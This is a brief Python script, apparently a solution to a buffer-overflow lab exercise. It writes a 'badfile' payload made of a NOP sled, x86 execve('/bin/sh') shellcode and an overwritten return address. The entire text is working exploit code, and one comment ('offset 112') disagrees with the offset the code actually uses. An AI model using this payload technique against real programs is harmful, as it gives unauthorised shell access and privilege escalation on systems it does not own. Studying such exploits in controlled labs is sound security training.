import sys 
 
shellcode= ( 
"\xBB\xE5\x62\x55\x56"
"\xFF\xD3"
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(1300)) 
# Put the shellcode at the end 
start = 1300 - len(shellcode) 
content[start:] = shellcode 
 
# Put the address at offset 112 
ret = 0xffffb718 + 150 
content[968:972] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

